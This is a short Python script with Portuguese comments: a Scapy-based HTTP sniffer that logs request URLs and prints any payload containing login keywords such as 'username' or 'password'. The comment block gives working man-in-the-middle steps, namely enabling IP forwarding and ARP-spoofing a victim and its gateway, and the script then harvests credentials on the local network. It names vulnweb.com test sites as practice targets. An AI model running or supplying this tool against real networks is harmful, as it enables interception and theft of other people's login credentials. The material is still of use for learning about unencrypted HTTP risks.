# Sniffer que não serve pra nada
# da pra testar esse sniffer para idiotas com o site vulnerável http://vulnweb.com/
#Passos:
# sudo su
# echo 1 > /proc/sys/net/ipv4/ip_forward
# sudo arpspoof -i eth0 -t 192.168.0.101 192.168.0.1
# sudo python scapy-sniffer-ecc.py
#Example site vuln = http://testhtml5.vulnweb.com/#/popular

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
        scapy.sniff(iface=interface,store=False, prn = process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ["username","user","login","pass","password"]
		for keyword in keywords:
			if keyword in keywords:
				if keyword in str(load):
					return load

def process_sniffed_packet(packet):
	# Só intercepta as requests HTTP (site inseguro/raro)
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request: " + str(url))
		login_info = get_login_info(packet)
		if login_info:
			print("\n \n [+] possible username/pass > " + str(login_info) + "\n \n ")


sniff("eth0")

